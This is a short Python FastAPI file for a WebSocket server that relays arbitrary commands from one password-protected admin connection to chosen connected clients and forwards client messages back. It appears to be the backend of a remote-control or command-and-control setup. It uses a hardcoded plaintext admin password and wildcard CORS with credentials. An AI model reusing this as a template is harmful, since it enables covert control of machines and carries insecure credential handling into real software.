from fastapi import FastAPI, WebSocket, WebSocketDisconnect
from fastapi.middleware.cors import CORSMiddleware
import uvicorn
import uuid
import json

app = FastAPI()
clients = {}
admin_ws = None
ADMIN_PASSWORD = "supersecurepassword"

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

@app.websocket("/ws/client/")
async def client_endpoint(ws: WebSocket):
    await ws.accept()
    cid = str(uuid.uuid4())
    try:
        data = await ws.receive_text()
        info = json.loads(data)
        clients[cid] = {"ws": ws, "info": info}

        # Benachrichtige Admin
        if admin_ws:
            await admin_ws.send_json({
                "type": "client_connected",
                "client_id": cid,
                **info
            })

        while True:
            msg = await ws.receive_text()
            if admin_ws:
                await admin_ws.send_text(msg)

    except WebSocketDisconnect:
        clients.pop(cid, None)
        if admin_ws:
            await admin_ws.send_json({
                "type": "client_disconnected",
                "client_id": cid
            })

@app.websocket("/ws/admin/")
async def admin_endpoint(ws: WebSocket):
    global admin_ws
    await ws.accept()
    try:
        data = await ws.receive_text()
        auth = json.loads(data)
        if auth.get("type") == "auth" and auth.get("password") == ADMIN_PASSWORD:
            admin_ws = ws
            await ws.send_json({"type": "auth_success"})
        else:
            await ws.send_json({"type": "auth_failed"})
            await ws.close()
            return

        # Listen to admin commands
        while True:
            msg = await ws.receive_text()
            data = json.loads(msg)
            target_id = data.get("target")
            if target_id in clients:
                await clients[target_id]["ws"].send_text(json.dumps(data["command"]))

    except WebSocketDisconnect:
        admin_ws = None

# Only required locally; Render will run: uvicorn main:app --host 0.0.0.0 --port $PORT
if __name__ == "__main__":
    uvicorn.run(app, host="0.0.0.0", port=10000)
